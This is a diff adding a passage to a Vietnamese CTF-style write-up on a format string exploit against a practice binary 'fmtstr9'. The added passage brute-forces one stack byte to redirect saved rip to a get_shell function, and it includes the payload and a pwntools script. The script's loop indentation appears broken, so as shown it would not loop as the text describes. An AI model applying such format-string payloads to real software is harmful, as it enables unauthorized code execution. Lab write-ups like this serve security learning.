@@ -723,7 +723,47 @@ Vậy ta cần đưa địa chỉ saved rip vào một con trỏ để ghi đè.
 
 Ta đã biết rằng saved rbp sau trỏ đến địa chỉ Stack chứa saved rbp trước. Tức nếu ta thay đổi saved rbp sau bằng địa chỉ Stack của saved rip thì saved rbp trước sẽ trở thành con trỏ saved rip
 
-![Alt text](image/fs50.png)
-
 Nhưng chúng ta không thể leak được địa chỉ Stack ra do chỉ có 1 lần *format string*. Vì Stack luôn động do cơ chế ALSR vậy nên lựa chọn duy nhất là brute force.
+Vì chỉ có BYTE đầu tiên là thay đổi nên tỉ lệ trúng là 1/256. Đây vẫn là một tỉ lệ cao để máy tính đoán trúng trong thời gian ngắn.
+
+payload:
+
+	payload=b'%c'*8
+	payload+=f'%{0x48-8}c%hhn'.encode()			//full form
+	payload+=f'%{((exe.sym["get_shell"] +5) &0xffff)-0x48}c%14hhn'.encode()	//nhập get_shell
+	p.sendlineafter(b'name: ', payload)
+
+Ở đây payload padding đầu cần dùng full form vì theo thứ tự thì full form sẽ thực thi trước rồi tới shortform. Điều này đảm bảo rằng khi format shortform đằng sau ghi đè lên đúng địa chỉ đã được thay đổi.
+
+Sau đó brute force bằng while đến khi tạo được shell.
+
+## Script Python
+
+	#!/usr/bin/env python3
+	from pwn import *
+	context.binary=exe=ELF('./fmtstr9',checksec=False)
+	
+	while True:
+		p=process(exe.path)
+
+	p.sendlineafter(b'> ',b'1')
+
+	payload=b'%c'*8
+	payload+=f'%{0x48-8}c%hhn'.encode()
+	payload+=f'%{((exe.sym["get_shell"] +5) &0xffff)-0x48}c%14hhn'.encode()
+	p.sendlineafter(b'name: ', payload)
+
+	p.sendlineafter(b'guess: ', b'1')
+
+	try:
+		p.sendline(b'echo ABCDABCD')
+		p.recvuntil(b'ABCDABCD')
+		break
+	except:
+		try:
+			p.close()
+		except:
+			pass
+	
+	p.interactive()
 
